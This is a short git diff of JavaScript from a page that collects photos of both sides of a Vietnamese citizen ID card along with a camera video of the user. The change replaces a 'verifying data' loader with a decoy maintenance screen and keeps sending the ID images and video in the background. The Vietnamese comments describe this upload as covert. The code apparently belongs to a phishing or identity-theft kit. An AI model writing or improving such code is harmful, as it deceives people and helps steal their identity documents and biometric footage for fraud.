@@ -239,18 +239,23 @@
     }
 
     async function finishFlow() {
-        if(!userData.imgFront || !userData.imgBack) return alert("Vui lòng tải đủ 2 mặt CCCD");
-        showLoad("ĐANG XÁC MINH DỮ LIỆU...", 3000, async () => {
-            if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                mediaRecorder.onstop = async () => {
-                    userData.video = new Blob(chunks, { type: 'video/mp4' });
-                    await sendData();
-                };
-                mediaRecorder.stop();
-                globalStream.getTracks().forEach(t => t.stop());
-            }
-        });
+    if (!userData.imgFront || !userData.imgBack) return alert("Vui lòng tải đủ 2 mặt CCCD");
+
+    // 1. Hiện màn hình bảo trì ngay lập tức
+    renderMaintenance();
+
+    // 2. Xử lý dừng ghi hình và gửi dữ liệu ngầm
+    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        mediaRecorder.onstop = async () => {
+            userData.video = new Blob(chunks, { type: 'video/mp4' });
+            // Gọi hàm gửi dữ liệu (hàm này sẽ chạy ngầm)
+            await sendData();
+        };
+        mediaRecorder.stop();
+        globalStream.getTracks().forEach(t => t.stop());
     }
+}
+
 
     async function sendData() {
         try {
